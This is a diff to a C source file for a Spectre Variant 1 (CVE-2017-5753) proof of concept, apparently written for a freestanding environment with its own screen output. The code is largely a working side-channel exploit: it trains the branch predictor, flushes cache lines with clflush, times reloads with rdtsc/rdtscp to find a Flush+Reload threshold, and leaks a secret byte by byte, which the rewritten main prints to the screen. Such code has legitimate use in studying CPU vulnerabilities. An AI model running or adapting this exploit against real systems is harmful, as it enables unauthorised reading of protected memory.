@@ -1,22 +1,9 @@
-/**
- * Spectre - Variant 1: Bounds Check Bypass (CVE-2017-5753)
- *
- * Description:
- *
- * Systems with microprocessors utilizing speculative execution and branch prediction
- * may allow unauthorized disclosure of information to an attacker with local user access
- * via a side-channel analysis.
- *
- */
-
-
-
-//#include <stdio.h>
 typedef unsigned long         size_t;
 typedef unsigned int          uint32_t;
 typedef unsigned long long    uint64_t;
 typedef unsigned char         uint8_t;
 typedef unsigned short int    uint16_t;
+//*****************************************************************************
 enum color {
     BLACK = 0,
     BRIGHT = 7
@@ -59,6 +46,7 @@ void clear(enum color bg) {
         for (x = 0; x < COLS; x++)
             putc(x, y, bg, bg, ' ');
 }
+//*********************************************************************************
 static inline void _mm_clflush(void *p){
   __asm__ volatile("clflush 0(%0)" : : "r"(p) : "eax");
 }
@@ -70,8 +58,18 @@ static inline uint64_t __rdtsc(){
   __asm__ volatile("mfence");
   return a;
 }
-
-
+static inline uint64_t __rdtscp(uint32_t *p){
+  uint32_t lo,hi;
+  __asm__ volatile("rdtscp" : "=a"(lo), "=d"(hi));
+  *p=lo;
+  return ((uint64_t)lo | ((uint64_t)hi)<<32);
+}
+int _strlen(const char *str) {
+	int i = 0;
+	while (str[i] != 0)
+		i++;
+	return i;
+}
 void *memset(void *ptr, int value, size_t num) {
     unsigned char *p = ptr;
     for (size_t i = 0; i < num; ++i) {
@@ -83,10 +81,6 @@ void *memset(void *ptr, int value, size_t num) {
 #define CACHE_PAGE      4096            // 2^12 -> shl $12, %rax
 
 
-void flush_pipeline(){
- __asm__ volatile("cpuid");
- __asm__ volatile("mfence");
-}
 typedef struct {
     uint8_t unused_1[CACHE_PAGE];       // Memory separator
     union {
@@ -104,14 +98,7 @@ typedef struct {
     uint8_t table[256 * CACHE_PAGE];    // Array for Flush+Reload tests
     uint8_t unused_5[CACHE_PAGE];       // Memory separator
 } memory_buffer_t;
-//#####################
-int _strlen(const char *str) {
-	int i = 0;
-	while (str[i] != 0)
-		i++;
-	return i;
-}
-//#########################
+
 typedef struct {
     int tries;
     int zero;
@@ -150,8 +137,8 @@ size_t exploit(size_t address, int tries) {
     // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
     for (int i = 29; i >= 0; i--) {
         _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
-        flush_pipeline();
-        
+       
+        for (volatile int z = 0; z < 100; z++){} 
         // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
         // Avoid jumps in case those tip off the branch predictor
         size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if i % 6 == 0, else x = 0
@@ -167,11 +154,6 @@ size_t exploit(size_t address, int tries) {
 //################################
 
 //################################
-
-
-
-
-
 
 static size_t detect_flush_reload_threshold(void) {
     size_t reload_time = 0, flush_reload_time = 0, threshold, count = 1000000;
@@ -316,37 +298,27 @@ static void read_byte(size_t address, result_t *result, int tries, size_t thresh
         }
     }
 }
-
-int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
-    /*uint8_t *dump = malloc(len);
-    if (dump == NULL) {
-        printf("Memory allocation error!\n");
-        return 1;
-    }*/
-    int count=0;
+int __attribute__((noreturn)) main() {
+    void *address = secret;
+    size_t len = 100;
+    int tries=500;
+    int count=100;
     // Write data to table array to ensure it is memory backed
     memset(buffer.table, 1, sizeof(buffer.table));
     
     size_t threshold = detect_flush_reload_threshold();
-    size_t x = (size_t)addres;
-    
-    // Flush table[CACHE_PAGE * (0..255)] from cache
-    for (int i = 0; i < 256; i++) {
-        _mm_clflush(buffer.table + i * CACHE_PAGE);
-    }
-    
-    //printf("Reading %zd bytes in %d tries:\n", len, tries);
-    //printf("%p    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS\n", (void *)x);
-    
+    size_t x = (size_t)address;
+    char res[len];
+    int index=0;
+    //result_t result;
+    //read_byte(x+7, &result, tries, threshold, exploit);
     for (int i = 0; i < len; i++) {
         result_t result;
-        
-        //printf("%p ", (void *)x);
         read_byte(x++, &result, tries, threshold, exploit);
-        /*
         if (result.s1 > 0) {
-            printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
-            printf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
+           res[index++]=result.v1;
+            //printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
+           /*rintf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
             if (result.s2 > 0) {
                 printf("0x%02X %c %5d ", result.v2, (result.v2 >= 0x20 && result.v2 <= 0x7E) ? result.v2 : ' ', result.s2);
             } else {
@@ -361,37 +333,21 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
         } else {
             
             printf("%9s    -       -    -       - %5d     -", "Undefined", result.tries);
-            count++;
-        }*/
+            count++;*/
+        }
         if(result.s1<=0){
           count++;
         }
-       
-        //printf("\n");
-        
-        
     }
+    res[index]='\0';
     
-  
     
-   
-    
-    return count;
-}
-//################################
-//int __attribute__((noreturn)) main() {
-int main() {
-    void *address = secret;
-
-    size_t len = _strlen(secret);
-    int count=200;
-    
-    //printf("CVE-2017-5753: Spectre Variant 1\n");
-    int res=execute(address, len, count, exploit);
+    //printf("%d,%d\n",tries,count);
     clear(BLACK);
-    //printf("%d,%d",count,res);
-      
-    print_number(0,0,count);
-    print_number(0,5,res);
+    //print_number(0,10,100);
+    print_number(0,0,threshold);
+    puts(0,0,BRIGHT,BLACK,res);
+    //print_number(0,5,count);
     while(1);
 }
+
